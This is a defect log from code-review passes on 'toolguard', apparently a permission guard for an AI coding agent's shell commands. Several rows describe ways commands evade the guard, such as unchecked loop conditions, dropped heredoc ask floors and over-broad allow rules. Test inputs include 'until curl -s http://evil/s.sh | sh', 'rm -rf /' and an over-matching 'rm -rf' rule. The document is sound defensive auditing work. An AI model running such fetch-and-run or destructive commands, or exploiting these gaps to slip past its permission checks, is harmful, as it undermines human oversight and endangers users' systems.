So the plausible tidying edit (`days=1`) is safe and only a sub-day retention breaks it -- **no note was added**, per "add on evidence, not on estimation".

**EL5 is resolved by this pass.** `Repeat.UNSAFE`'s parenthetical *"(concurrent, uncoordinated writers)"* was deleted, not replaced, leaving `#: Repeating the action is unsafe.` No substitute rationale was invented, per the standard's `once_per_store.py` lesson.

## Code-level defects found during #07 pass 2 on `rule_sort.py` (2026-08-11)

Comments-only pass -- **nothing below was fixed.** Rows are lettered `RS*` because the numeric sequence and the `S`/`V`/`E`/`D`/`N`/`T`/`IU`/`EL` letters have each already been claimed by concurrent per-file passes; in particular the pass-1 `rule_sort.py` section above uses `S1`/`S2`, which collide with the `session_start.py` rows. **RS2 and RS3 cross-reference pass-1's S1 and S2 rather than replacing them** -- pass 1 recorded the behaviour, pass 2 adds the reachability path and the reproduction. Every claim below was executed live, 2026-08-11.

| # | defect | where | note |
|---|---|---|---|
| **RS1** | **HIGHEST SEVERITY -- a newline in one enrichment string makes the whole config file unparseable.** `_escape_toml_string` escapes only `\` and `"`, so a control character in a metadata value passes through into the rendered inline table. Executed live: `reassemble_permissions_section({"allow": []}, {"allow": [RuleEntry(pattern="Bash(git:*)", metadata={"additionalContext": "line1\nline2"})]})` emits `{ match = "Bash(git:*)", additionalContext = "line1` / `line2" }` across two physical lines, and `tomllib.loads` on the resulting section raises `TOMLDecodeError: Illegal character '\n' (at line 3, column 54)`. `\r` and `\x00` fail the same way (`Illegal character '\r'` / `'\x00'`); `\t` is accepted. Reachable from a JSON config's `"additionalContext": "line1\nline2"` or a TOML `\n` escape, through the from-scratch writer (`render_toml_entry` -> `_render_toml_scalar` -> `_render_toml_inline_table`). **This is the precise failure the module docstring's "Structured entries are single-line, always" section exists to prevent, produced by the module itself** -- and because a parse failure clamps every governed decision (bar an already-`deny` one) to `'ask'`, one enrichment string bricks the config into permanent prompting until a human finds it. | `toolguard/rule_sort.py:_escape_toml_string`, reached via `_render_toml_inline_table` | **Fix belongs in `_escape_toml_string`:** escape `\n`, `\r`, `\t` and the other C0 controls as `\uXXXX` (TOML 1.0 requires exactly that for control characters in a basic string). Cross-references RS2 rather than duplicating it -- both are the same renderer emitting text `tomllib` will not read back. The docstrings on `_escape_toml_string` and `_render_toml_inline_table` now state the gap plainly instead of promising a valid single-line table, but the behaviour is unchanged. |
| **RS2** | **Cross-reference, do not double-count: pass-1 row `S1`** (`None` renders as the quoted string `"None"`). New in pass 2 -- **the reachability chain, end to end:** a JSON config's `permissions.allow` containing a literal `null` -> `rule_entry.normalize_entries_preserving` preserves it as `RuleEntry(raw=None, synthesized_pattern=True)` -> `permission_migration.generate_permissions_section` (the `render_toml_entry` call in its entry loop) -> `render_toml_entry` -> `_render_toml_scalar`'s final `str()` fallback -> `"None"`. This is the exact corruption `rule_entry._UNSET` was introduced to prevent one level up, defeated one level down. | `toolguard/rule_sort.py:_render_toml_scalar` (final `return`) | Recorded, not fixed. Decide with RS1: both are "the renderer emits something the loader cannot read back", and a single pass over `_render_toml_scalar`/`_escape_toml_string` closes them together. |
| **RS3** | **Cross-reference, do not double-count: pass-1 row `S2`** (`if not entries: continue` discards a sub-list's entire comment set). New in pass 2 -- **the reproduction, which shows it does not need an explicitly empty list.** With a file whose `deny` array carries `# NEVER remove: blocks force-push to main` above `"Bash(git push --force:*)"`, reassembling with `{"allow": ["Bash(a)"], "deny": []}` **and** with `{"allow": ["Bash(a)"]}` -- `deny` simply omitted -- both return `'[permissions]\nallow = [\n  "Bash(a)",\n]\n'`. The comment vanishes silently: no exception, no warning, and `config_write_guard.verified_write_config`'s `expected_patterns` check covers patterns, not comments, so nothing downstream notices either. | `toolguard/rule_sort.py:reassemble_permissions_section`, the `if not entries: continue` guard | Sharpens pass-1 row `S2`, which recorded the loss but not that an *omitted* key triggers it identically to an empty one. Any caller building `new_permissions` from a partial dict loses that sub-list's comments. |
| **RS4** | **NEW: the first rule's leading comment does not travel with its rule, and silently re-attributes itself to a different one.** Every other comment block is keyed to the rule that follows it and moves with it under the sort; a block preceding the FIRST rule lands in `top_comments` instead and is re-emitted at the top of the sub-list, above whatever now sorts first. Executed live: `allow = [` / `  # NEVER remove: this is what blocks the force push` / `  "Bash(zz:*)",` / `  "Bash(aa:*)",` / `]` reassembles with that comment sitting above **`"Bash(aa:*)"`**. Same mechanism, second form: **a blank line does not terminate a comment block**, so a genuine top-of-list anchor separated by a blank line from the first rule's own comment parses as ONE block (verified: `'  # top anchor\n\n  # first rule\'s own'`) and both are anchored to the top. | `toolguard/rule_sort.py:reassemble_permissions_section` (the `if not seen_first_rule` branch), `_flush_comment_lines` (blank-line handling) | Worse than losing a comment: a prescriptive warning ends up attached to a rule it was never about, and reads as authoritative. The docstring on `parse_permissions_section_with_comments` now states both halves explicitly (pass 1's text asserted "travels with its rule" and "anchored to the top" side by side without saying which wins), but the behaviour is unchanged. Fix direction, if wanted: treat a block separated from the first rule by a blank line as a top anchor and one adjacent to it as that rule's own -- which requires `_flush_comment_lines` to stop swallowing interior blanks. |
| **RS5** | **NEW: `_render_toml_scalar` raises `TypeError` on a dict with a non-string key.** `_render_toml_key` calls `re.fullmatch` on the key with no type guard, so a metadata value that is itself a dict keyed by anything but `str` propagates out of the renderer: executed live, `_render_toml_scalar({5: "v"})` and `render_toml_entry(RuleEntry(pattern="Bash(x)", metadata={"m": {5: "v"}}))` both raise `TypeError: expected string or bytes-like object, got 'int'`. Reachability is low -- it needs a nested non-`str`-keyed dict, which no supported config format produces directly -- but `RuleEntry.metadata` is documented as **unconstrained in value type** (`rule_entry.py:131`), so nothing in the type system forbids it. | `toolguard/rule_sort.py:_render_toml_key`, reached from `_render_toml_scalar` / `_render_toml_inline_table` | Recorded because it falsifies the "can never fail on an unexpected value type" contract the write path was leaning on -- that sentence was written by pass 1 and has been removed. One-line fix if wanted: `if isinstance(key, str) and re.fullmatch(...)`, falling through to the quoted form otherwise. |

## Code-level defects found during #07 on `toolguard/tools/` (`pattern_overlap.py`, `sorters.py`, `working_tree.py`, `self_integrity.py`, `__init__.py`) (2026-08-11)

Comments-only pass -- **nothing below was fixed.** Rows lettered `TL*` (tools layer) because the numeric sequence and the `S`/`V`/`E`/`D`/`IU`/`EL` letters are already claimed by concurrent per-file passes. Every claim below was executed live, 2026-08-11, against the real matcher.

| # | defect | where | note |
|---|---|---|---|
| **TL1** | **HIGH -- a multi-token DEFAULT allow rule is broader than it reads: `Bash(git commit:*)` also allows `git commit-tree` and `git commitfoo`.** `match_command`'s `args_pattern in ("*", "**", "")` branch builds `full_cmd_pattern = base_cmd + cmd_pattern[len(base_cmd):] + "*"` (`permissions.py:163`), gluing the `*` straight onto the LAST token with no separator. The `matched_base` guard above it (`cmd_var.startswith(bc + " ") or cmd_var == bc`, line 158) enforces a token boundary on the **first** token only, so single-token patterns are safe -- executed: `Bash(git:*)` does **not** match `github status` -- while every token after the first is matched as a bare string prefix. Executed: `git commit:*` matches `git commit -m x` **and** `git commit-tree abc` **and** `git commitfoo -x`. On an allow rule this is an over-grant; the same shape on a deny rule is an over-block. | `toolguard/permissions.py:155-165` (`match_command`, the `args_pattern in ("*","**","")` branch) | Fix direction: apply the same boundary test to the last token that `matched_base` applies to the first -- e.g. require the command to equal `cmd_pattern` or start with `cmd_pattern + " "` before the `fnmatch`. Worth a corpus replay before changing: the current looseness may be load-bearing for existing allow lists (`Bash(uv run:*)` matching `uv run` with no args still works either way, but anything relying on the glued form would tighten). Not a regression -- it appears to have always behaved this way. |
| **TL2** | **`prefixes_overlap` under-reports overlap, as a direct consequence of TL1.** It returns `True` only when one token list is a prefix of the other, which is *sufficient* for the two patterns to share a command but not *necessary*. Brute-forced over 79,401 pattern pairs x 798 commands built from a 7-token vocabulary: **0** cases where it claimed overlap and none existed, and **315** cases where the two patterns share a matching command and it returned `False`. Witness: `['uv','run']` / `['uv','runx']` share `uv runx`; the realistic form is `Bash(git commit:*)` / `Bash(git commit-tree:*)` sharing `git commit-tree abc`. | `toolguard/tools/pattern_overlap.py:prefixes_overlap`, consumed by `tools/consolidate.py:856` (broadening guard-overlap evidence) and `tools/clarity.py:221,286` (rule-interaction detection) | Both consumers use it in the **safe** direction -- a missed overlap means a guard is not credited / an interaction is not reported, i.e. a false negative in an advisory analyzer, never a wrongly-granted permission. So this is a completeness bug, not a safety one, and it disappears on its own if TL1 is fixed at the matcher. The docstring was corrected in this pass to state the one-directional truth instead of "exactly when". |
| **TL3** | **`sort_layer_rules` and `stable_rule_key` have no non-test callers.** `grep` across `toolguard/`, `tools/`, `docs/` and `test/` finds them called only from `test/unit/test_tools_sorters.py`; the sole other mention anywhere is prose in `tools/architecture_fitness.py:1317`, which cites `sort_layer_rules`'s return annotation as a worked negative example for its verdict-tuple detector -- so deleting the function would leave that docstring stale. `sorters.py` also re-exports `get_tool_priority`/`sort_patterns` unchanged from `rule_sort`, and every production call site imports those from `rule_sort` directly (`permission_migration.py:54-60`). The whole module is a pass-through with a test suite. | `toolguard/tools/sorters.py` | Candidate for deletion, or for absorbing `sort_layer_rules` into `rule_sort` if the three-list convenience is wanted. Same class as EL7 (`load_config_sync_settings`): the question is not "who calls it" but "what does it add". The `__all__` comment justifying the re-export "so callers ... continue to work without change" was removed in this pass -- per the standard, toolguard has no external importers to preserve. |
| **TL4** | **`sorters.py`'s annotations are narrower than the functions they wrap.** `sort_layer_rules(allow: List[str], deny: List[str], ask: Optional[List[str]])` and `stable_rule_key(pattern: str)` promise `str`, but they delegate to `sort_patterns`/`get_tool_priority`, which accept `rule_sort.RuleEntryOrStr` (`str` **or** `RuleEntry`) and handle both. A caller holding structured `RuleEntry` rules -- the normal shape after `normalize_entries_preserving` -- is type-refused by the wrapper for something the callee does fine. | `toolguard/tools/sorters.py:45-49,72` | Only matters if TL3 resolves as "keep". If kept, widen to `RuleEntryOrStr`. |

### Refactoring candidates surfaced by the comment sweep

* **`permissions.match_command` (`permissions.py:77-175`) is where the comments cluster.** One function carries the newline guard, the `**/x/**` path-component special case, the `**`->`*` normalization, the `cmd:args` split, the base-command path-normalization variants, and two different fnmatch shapes -- six inline comment blocks over ~90 lines, each of which would read as the docstring of an extracted branch. TL1 lives inside the branch with the least commentary, which is consistent with the standard's observation that this shape hides defects. Not touched: out of scope for a comments-only pass, and it is not one of this pass's files.
* **`pattern_overlap.split_default_body` is public but is not an overlap helper.** Three of its four uses in `consolidate.py` (lines 418, 496, 687, 939) are plain pattern parsing with no overlap question in sight. It reads as a `patterns.py`-level primitive that landed here because `default_prefix_tokens` needed it.

### Comment defect in a file outside this pass's scope

* **`toolguard/permissions.py:146-148` understates what base-command normalization does.** The comment reads *"A pattern's base command is normalized the same way a real command is, so e.g. `bin/x:*` and `./bin/x:*` both canonicalize to `./bin/x`"* -- true, and it sits four lines above the `full_cmd_pattern` construction that is TL1. A reader who takes the paragraph as the description of how the command portion is matched will not notice that only the base command gets a boundary. Worth one clause when TL1 is addressed.

## Code-level defects found during #07 pass 2 on `toml_scan.py` / `config_validation.py` (2026-08-11)

Comments-only pass -- **nothing below was fixed.** Rows are lettered `TCV*` because the numeric sequence and the `S`/`V`/`E`/`D`/`N`/`T`/`IU`/`EL`/`RS`/`TL` letters are each already claimed by concurrent per-file passes. **All three defects this pass was asked to record were already in the queue** -- pass 2 re-executed them rather than re-filing them, so the corroborations below are cross-references, not new findings. Do not double-count. Only `TCV1` is new.

**Corroborated by execution, 2026-08-11 (existing rows, unchanged):**

* **Row `V1`** (spurious ungoverned-tool warning when a project never sets `governed_tools`) -- re-confirmed at the unit level: `validate_permissions({"governed_tools": [], "permissions": {"allow": ["Bash(ls)"]}})` emits *`Tool "Bash" appears in permissions but is not in governed_tools list`*, while the same call with the key **absent** emits nothing for `Bash`. That is the whole defect in two lines: `config.py:1689` seeds the key as `[]`, so `config_validation.py:59`'s `["Bash"]` default is unreachable from the only production caller. `validate_permissions`' `Args:` block now states that fallback explicitly -- accurate as this function's own contract, and knowingly at odds with what the production caller can reach. That disagreement is recorded here deliberately; fixing `V1` is what resolves it.
* **Row `V2`** (`get_native_permissions` raises on a non-object JSON top level) -- unchanged; `config_divergence.py:51`'s `config.get("permissions", {})` still sits outside the `try` at 41-44, and `config.py:_try_parse_source` still guards exactly that shape three files over.
* **Row `T1`** (`perm_type` interpolated into a regex without `re.escape`) -- both failure modes re-executed: `_locate_subsection("[permissions]\n", "a(")` raises `re.PatternError: missing ), unterminated subpattern at position 12`, and `_locate_subsection("[permissions]\na|b = [\n]\n", "a|b")` returns the silently wrong span `(14, 14, 24)` -- the alternation parses as `(^[ \t]*a)|(b\s*=\s*\[)`, so `open_pos` points at the `a`, not at the `[`. The wrong-span mode is the worse of the two and was not stated on `T1`; it is the reason the fix should be `re.escape` **and** a `Literal` parameter type, not either alone.

| # | defect | where | note |
|---|---|---|---|
| **TCV1** | **Sharpens row `T2`: `tomllib`'s own message points at the EARLIER offender in exactly the case where `find_multiline_structured_entry_line` points at a later one.** Executed live on a file whose `ask` array holds a multi-line structured entry opening at line 3 and whose `allow` array holds one opening at line 7: `tomllib` reports *`Invalid initial character for a key part (at line 3, column 23)`* and the function returns **7**. So the diagnostic that exists to improve on `tomllib`'s message hands the user a *later* line number than the message it replaces. `T2` recorded the search-order behaviour; what is new is that the comparison is against a baseline that happens to be right about position. Severity is still cosmetic -- both lines are genuine offenders and both must be fixed -- but it removes the "at least it is no worse than the fallback" reading. | `toolguard/toml_scan.py:find_multiline_structured_entry_line`, message built in `toolguard/config.py:_multiline_structured_entry_diagnostic` | Decide with `T2`. Sorting the candidates by absolute position before returning would make the function agree with `tomllib` on location while keeping the better cause description; reporting all offenders would be better still, since the current message implies there is one. The docstring's `Returns:` block already warns that the result "is not necessarily the earliest line". |

## Code-level defects and doc drift found during #07 on `tools/installer.py` (2026-08-11)

Comments-only pass -- **nothing below was fixed.** Rows lettered `INS*` because the numeric sequence and the `S`/`D`/`IU`/`EL`/`T` letters have each been claimed by concurrent per-file passes.

| # | defect | where | note |
|---|---|---|---|
| INS1 | **The state-dir README tells the user a backup filename format that `create_backup` never produces.** `_README_TEMPLATE` says backups are *"named after the original file (e.g. `settings.json.2026-07-07-141200`)"*. `permission_migration.create_backup` splits on the suffix and builds `f"{stem}.{timestamp}"` + the original suffix, i.e. **`settings.2026-07-07-141200.json`** -- timestamp before the extension, not after. The example is the one thing a user scanning `~/.toolguard/backups/` would pattern-match on. | `toolguard/tools/installer.py:_README_TEMPLATE` (the `backups/` bullet) vs `toolguard/permission_migration.py:create_backup:173-186` | Strings are code; not edited. One-line fix to the template. Note `_backup_directory` in the same file *does* use the `<name>-<timestamp>` shape the README describes -- but only for skill **directories**, which the README bullet does not mention. |
| INS2 | **An invalid-UTF-8 settings or `~/.claude.json` file crashes `discover-projects` and `skills-status`, both documented as never failing.** Three read sites catch `OSError`/`json.JSONDecodeError` but `Path.read_text()` raises `UnicodeDecodeError`, a `ValueError` subclass and **not** an `OSError`, so it propagates: `_load_claude_json_projects:1273`, `_discover_project_candidate:1352`, `_hook_registration_findings:1994`. `_DISCOVER_PROJECTS_HELP` and `_SKILLS_STATUS_HELP` both promise a read-only diagnostic that only errors on "a genuine filesystem/permissions failure", and `cmd_discover_projects` returns "0 always". | `toolguard/tools/installer.py`, the three `except` clauses named | Fix: add `UnicodeDecodeError` (or `ValueError`) to each, or pass `errors="replace"`. Cheap, and it restores the documented contract. The docstring of `_load_claude_json_projects` was narrowed during this pass to say `OSError` rather than the vaguer "unreadable", so the code and the comment now agree -- and both differ from the help strings, which are code. |
| INS3 | **`_parse_git_source` silently declines to split a slash-bearing branch name.** `git+https://host/o/r@release/1.2` returns `('https://host/o/r@release/1.2', None)` -- executed 2026-08-11 -- so `install-skills` then runs `git clone https://host/o/r@release/1.2` and fails with a clone error that names neither the branch nor the reason. Branch names containing `/` are common. The guard is deliberate (it stops `git@github.com:o/r` splitting), but the failure mode is a confusing error rather than a refusal. | `toolguard/tools/installer.py:_parse_git_source:1462` | Not fixed; behaviour is now stated in the docstring rather than implied by the old text, which asserted that "a real ref (branch/tag/commit) never" contains a `/`. That assertion was **false** -- see INS-DOC below for the same claim in the help string. A fix would split on the *last* `@` that follows the host component, or accept an explicit `--ref`. |
| INS4 | **`_INSTALL_SKILLS_HELP` repeats INS3's false claim, in user-facing text.** It says a trailing `'@ref'` becomes `git clone --branch ref` "so branch pinning is preserved", with no mention that a `/` in the ref silently disables that. An agent reading the `--help` to decide whether a step does what it wants is exactly the audience this misleads. | `toolguard/tools/installer.py:_INSTALL_SKILLS_HELP` | Strings are code; not edited. Fix together with INS3. |
| INS5 | **The seeded uninstall-readiness ALLOW rules over-grant, and the module that defines them denies it in prose.** Executed against `match_command` 2026-08-11: `rm -rf ~/.claude/skills/toolguard-security-audit:*` also matches `rm -rf ~/.claude/skills/toolguard-security-audit /home/USER/projects`; `rm ~/.claude/toolguard_hook.toml:*` also matches `rm ~/.claude/toolguard_hook.toml.orig`; `uv tool uninstall toolguard:*` also matches `uv tool uninstall toolguard-other`. All three are the multi-token DEFAULT prefix over-match of **proposed ticket 18** -- the boundary guard covers the first token only -- and these are `allow` rules seeded into a governed install by `seed-self-perms`, so the blast radius is a user's own tree. `uninstall_readiness.py`'s module docstring defends the `allow`-not-`ask` choice with *"every pattern here is a literal, single-purpose command or exact file path -- not a wildcard grant -- so it can only do the one thing it is scoped to"*, which the matcher refutes for the four `rm`/`uv tool uninstall` entries. | `toolguard/tools/uninstall_readiness.py` (module docstring, "Design guard-rails" bullet 1, and the four patterns) ; inherited by `toolguard/tools/installer.py:_SEED_SELF_PERMS_HELP` ("removing toolguard's own config/skill files") | Out of this pass's scope -- `uninstall_readiness.py` is frozen and both texts are a docstring in another file and a help **string**. Ticket 18 is the real fix; until it lands, the docstring's defence should be narrowed rather than the rules loosened further. Worth deciding together, because the argument for `allow` over `ask` rests on the sentence that is wrong. |
| INS6 | **`cmd_install_skills` is neither atomic nor backed out, in the one subcommand that can produce two changes.** `shutil.rmtree(dst)` then `shutil.copytree(src, dst)` (`installer.py:1546-1547`, `--force` path): a failure between them leaves the skill **deleted**, with only the pre-made backup and no journal entry pointing at it. And `_append_journal_entry` runs only after the whole `_BUNDLED_SKILL_NAMES` loop has finished (`:1557-1573`), so a crash on skill 2 leaves skill 1 installed with **no journal record and no stated reverse** -- the exact case the journal exists for. Both are recoverable by hand; neither is discoverable by the next session. | `toolguard/tools/installer.py:cmd_install_skills` | Copy to a sibling temp dir and `os.replace` it in, or journal each skill inside the loop as it completes. The second is a two-line change and fixes the worse half. |
| INS7 | **`main` cannot report a `ValueError`.** It catches `(InstallerError, ConfigWriteVerificationError)` only, so anything else tracebacks instead of printing `error: ...` and exiting `2` -- which today is exactly how INS2's `UnicodeDecodeError` surfaces to the calling agent, and will be how any future `ValueError` path does. Sharpens INS2: the hole is not only the three `except` clauses, it is that nothing downstream converts a stray `ValueError` into the documented failure shape. | `toolguard/tools/installer.py:main` | Decide with INS2. Widening `main`'s handler is not a substitute for fixing the read sites -- a `UnicodeDecodeError` reported as `error: 'utf-8' codec can't decode byte...` is still a subcommand that failed where its `--help` promises a diagnostic. |

### Comment defects in files outside this pass's scope

* **`test/unit/test_tools_installer.py:test_session_start_hook_is_never_hardened`'s docstring over-claims, in the same way the installer comment did.** It says hardening SessionStart "would make shadow/**stale-install** detection permanently and silently blind". Only the *shadow* half goes through `install_provenance.governing_package_root()` (`session_start.py:351`, feeding `ShadowStatus.running_from_checkout`). `stale_install_report` (`install_provenance.py:242-281`) uses `source_checkout_root`, `installed_distribution_root`, git cleanliness and file hashes -- none of which depend on the governing copy -- so stale detection would survive hardening intact. The installer-side comment was corrected during this pass; the test docstring, which the installer comment points at, still carries it. The test itself is correct and should stay.
* **Pass 2 (2026-08-11) re-verified the above leg by leg, and it stands -- with the scoping now confirmed correct on the installer side.** `governing_package_root()` is `Path(__file__).resolve().parent`, so under `-E -P` it can only ever be site-packages and the shadow comparison is permanently `False`; but `session_start._detect_shadow_status` passes `checkout_root` explicitly, so `stale_install_report` never takes the `source_checkout_root()` default, and `installed_distribution_root`, `_git_subtree_is_clean` and `_hash_py_files` do not consult `governing_package_root()` either. Stale detection therefore survives hardening intact. **The stale copy of the claim is now the test docstring alone** -- and it is the docstring of the test that *pins* the behaviour, which is the worst place for it. `test/` is frozen for this sweep; this is the one item here that should be fixed in the test tree rather than the source.

### Refactoring candidates surfaced by the comment sweep

| # | function | signal | shape of the fix |
|---|---|---|---|
| INS-R1 | `installer.cmd_seed_self_perms` | **Pass 2 correction: the body is ~175 lines (`:776-951`) carrying FIVE explanatory blocks, not four** -- the normalization note, the membership-by-pattern note, the "seeded unconditionally" rationale, the second normalization note, and the `expected_patterns` note. Pass 2 shortened each; none could be deleted, which is itself the signal. Original entry, unchanged: ~110-line body carrying **four** separate comment blocks, one per phase: read-and-normalize `[permissions]`, assemble candidates from four different sources, diff against what is present, then repeat the whole cycle for `[hard_deny]` with its own normalization and its own `expected_patterns` construction. The `[hard_deny]` half is a near-duplicate of `cmd_seed_hard_deny`, which carries the same two comments again. Same "comments cluster over a sequence of concerns" signal as R2/R4/S-R1. | Candidate: `_read_normalized_permissions(text)` and `_read_normalized_hard_deny(text)` returning the normalized lists; `_self_permission_candidates(scope, project_dir)` returning the `(pattern, list_type)` list; `_add_missing(entries, candidates)` returning `(added, already_present)` -- which `cmd_seed_hard_deny` would share. Not attempted here -- comments-only pass. |
| INS-R2 | `installer.cmd_register_hooks` | ~90 lines doing four unrelated things -- build the hardened command, merge `PreToolUse` matchers, merge the `SessionStart` entry, then build `expected_patterns` and write -- with the two longest comments in the file (the SessionStart hardening hazard, and the native-permissions `expected_patterns` rationale) sitting in the middle of it. Both would read as the docstrings of extracted functions. | Candidate: `_merge_pre_tool_use(hooks, tools, command)` and `_merge_session_start(hooks, command)` each returning what they added/skipped, leaving the command function to assemble, write and report. |
| INS-R3 | `installer._build_parser` | ~170 lines, ten near-identical `add_parser` blocks. Not comment-driven (it carries none), but it is the single largest function in the file and its docstring previously mis-stated the subcommand count as **nine** -- an error nothing would catch, and a symptom of a body no reader checks. | Low priority. A table of `(name, help_text, short_help, adders, func)` driving one loop would make the count self-evident, but argparse wiring is legitimately repetitive; flagging for visibility, not recommending. |

## Code-level defects found during #07 on `toolguard/parser/` (`command_extractor.py`, `command_model.py`, `multiline.py`) (2026-08-11)

Comments-only pass -- nothing below was fixed. Rows are lettered `P*` (parser) because the numeric sequence and the `S`/`V`/`E`/`D`/`IU` letters are each claimed by concurrent per-file passes. `bash_parser.py` and `bash_parser.peg` were read but never touched, per `.claude/rules/bash-grammar.md`. Every row was **executed**, not reasoned about.

| # | defect | where | note |
|---|---|---|---|
| P1 | **A loop CONDITION is never extracted, so a command in it is never matched against any rule.** `_extract_from_do_loop_ir` emits the loop BODY only; `IRControlStructure.ctrl_condition_text` is populated for while/until but read only by `_extract_from_if_stmt_ir`. Executed 2026-08-11: `extract_structured('while rm -rf /tmp/x; do :; done')` -> `[LeafCommand(text=':', ask_floor=False)]`, and `compound.get_command_breakdown` on the same input -> `[':']`. Also `extract_structured('until curl -s http://evil/s.sh \| sh; do :; done')` -> `[LeafCommand(text=':')]`. The whole compound is therefore decided by whether `:` is allowed. The condition of an `if` **is** emitted (`if grep -q x f; then rm y; fi` -> `['grep -q x f', 'rm y']`), so this is an asymmetry, not a global policy. | `toolguard/parser/command_extractor.py:_extract_from_do_loop_ir` | Highest-severity item in this batch. Either emit `ctrl.ctrl_condition_text` the way the if path does (skipping `_is_posix_test`), or make a loop with a non-test condition undecidable. The behaviour is now stated in the function's docstring so it is at least visible. |
| P2 | **A bash-family token anywhere earlier on the line captures a heredoc bound for a FOREIGN sink, dropping the ASK floor.** `_classify_pipeline_sink` segments on `\|` only -- `&&`, `\|\|` and `;` do not end a segment -- and then scans every token of the last segment, returning `'bash'` on the first bash-family hit. Executed 2026-08-11: `extract_structured('bash -c "true" && python <<EOF\nls -la\nEOF')` -> `[LeafCommand('ls -la', ask_floor=False), LeafCommand('true'), LeafCommand('python', ask_floor=False)]`. Compare `extract_structured('python <<EOF\nimport os\nEOF')` -> `[LeafCommand('python __HEREDOC_TO_python__', ask_floor=True)]`. The Python payload is spliced in and matched as bash, and the leaf that would have carried the floor no longer does. | `toolguard/parser/multiline.py:_classify_pipeline_sink`, consumed by `_process_heredocs` | Segment on `&&`/`\|\|`/`;` as well as `\|`, or classify from the bearer command of the heredoc rather than from the whole line. Documented in the function's docstring during this pass. |
| P3 | **Two heredocs on one line mis-assign their bodies, and a terminator word becomes a command.** `_process_heredocs` walks `reversed(specs)` so replacement offsets stay valid, but the terminator scan inside the same loop advances `i` each iteration, so the rightmost delimiter claims the leftmost body. Executed 2026-08-11: `_process_heredocs(['bash <<A <<B','echo from-A','A','echo from-B','B',''])` -> `['echo from-A', 'A', 'echo from-B', 'bash']`. The literal terminator `A` is emitted as a leaf command and permission-checked as one. | `toolguard/parser/multiline.py:_process_heredocs` | Separate the two concerns: scan all bodies left-to-right first (bash assigns them in source order), then do the text replacements right-to-left. Documented in the function's docstring during this pass. |
| P4 | **An escaped single quote hides every later heredoc on the line from the pre-pass.** `_find_heredocs_in_line`'s quote guard is `line[:m.start()].count("'") % 2 == 1`, which counts escaped quotes. Executed 2026-08-11: `_find_heredocs_in_line("echo it\\'s && cat <<EOF")` -> `[]`, and end to end `extract_structured("echo it\\'s && cat <<EOF\nrm -rf /\nEOF")` -> `[LeafCommand("echo it\\'s"), LeafCommand('cat <<EOF'), LeafCommand('rm -rf /'), LeafCommand('EOF')]`. Here the body surfaces as a checkable command (fail-safe by accident) and `EOF` becomes a bogus leaf -- but with a foreign sink the sentinel and its ASK floor are lost the same way. The in-file comment claimed the count was of "unescaped" quotes; it is not. | `toolguard/parser/multiline.py:_find_heredocs_in_line` | `_split_on_unquoted_pipe` in the same module already has a correct quote scanner (single, double, escapes). Reuse it instead of the parity count. Documented during this pass. |
| P5 | **`_join_backslash_continuations` treats an apostrophe inside double quotes as opening a single-quoted string.** It tracks `in_single` with no `in_double` state. Executed 2026-08-11: `_join_backslash_continuations('echo "don\'t \\\\\nstop"')` returns the text **unchanged** (continuation not joined), while `_join_backslash_continuations('echo "ab \\\\\ncd"')` correctly returns `'echo "ab cd"'`. The un-joined newline then reaches the grammar, where it is a statement separator. | `toolguard/parser/multiline.py:_join_backslash_continuations` | Track double quotes too, as `_split_on_unquoted_pipe` and `_strip_comments` both already do. Documented as a KNOWN LIMITATION during this pass. |
| P6 | **`_FOREIGN_INLINE_FLAGS["awk"] = ["-f"]` is inverted.** `awk -f prog.awk` runs a program from a FILE; awk's inline program is the bare first argument. Executed 2026-08-11: `_detect_foreign_inline_code("awk -f prog.awk f")` -> `True` (ASK floor on a file-driven run) and `_detect_foreign_inline_code("awk '{print $1}' f")` -> `False` (no floor on genuine inline code). The table is code, so it was not touched; `_detect_foreign_inline_code`'s docstring already documented the second half correctly and now does not assert the first. | `toolguard/parser/command_extractor.py:_FOREIGN_INLINE_FLAGS` | Decide what awk should mean here. Detecting awk's bare program argument needs a rule the current flag-scan shape cannot express. |
| P7 | **A one-line `case` statement does not parse at all**, so the `NodeKind.CASE_STMT` branch in `_structured_from_ir_element` is unreachable for the form Claude Code actually emits. Executed 2026-08-11: `bash_parser.parse('case x in a) ls;; esac')` raises `ParseError`; `case x in a) ls ;; esac` and `case $x in a) ls;; b) rm;; esac` likewise. Only the newline-separated form (`'case x in\na)\nls\n;;\nesac'`) parses, and that one does reach the CASE_STMT branch. Both routes end at ASK, so there is no bypass -- but one arrives with the reason `"case statement cannot be statically decomposed"` and the other with `"command did not parse; cannot safely decompose"`. | `toolguard/parser/bash_parser.peg`, `case_clause` / `body_end` interaction | Grammar change, therefore the two-phase procedure in `.claude/rules/bash-grammar.md`. Low priority: the outcome is ASK either way, only the audit reason differs. |
| P8 | **`cmd; <control structure>` does not parse.** Executed 2026-08-11: `extract_structured('ls; for i in 1 2; do ls; done')` -> `UndecidableSegment(reason='command did not parse; cannot safely decompose')`, while `extract_structured('for i in 1 2; do ls; done; ls')` -> two leaves. `compound_command`'s `trailing_semicolon` consumes the `;` that `rest_stmts` then needs as a `statement_sep`. Fail-safe (ASK), but it turns an ordinary shape into an undecidable blob. | `toolguard/parser/bash_parser.peg`, `program` / `trailing_semicolon` | Same two-phase grammar procedure. |
| P9 | **`(( ... ))` in command position is decomposed as nested subshells rather than recognised.** Executed 2026-08-11: `extract_structured('((x=$(whoami)))')` -> `[LeafCommand(text='x=$(whoami)')]` and `extract_structured('((1+1))')` -> `[LeafCommand(text='1+1')]`. `(( ))` is only treated as complex inside a control-structure CONDITION (`_has_complex_condition`); as a statement it becomes a leaf whose text no longer resembles what the user typed. | `toolguard/parser/bash_parser.peg` (no arithmetic-command rule); surfaces in `command_extractor` | Arithmetic commands cannot invoke a program except through a substitution, so the risk is bounded -- but the leaf text handed to the matcher is misleading. |
| P10 | **`parse_command_line` has zero non-test callers.** Grep 2026-08-11 across `toolguard/`, `tools/` and `test/`: the only importer is `test/unit/test_compound.py`. Same class as the `is_structured` / `installed_origin` rows above, and rule 9 of the #07 standard ("there is no backward compatibility to preserve") applies directly -- its docstring called itself a legacy compatibility wrapper. | `toolguard/parser/command_extractor.py:parse_command_line` | Delete it and re-point `test_compound.py` at `extract_commands`, or find the intended consumer. Its docstring was reduced to one line during this pass. |
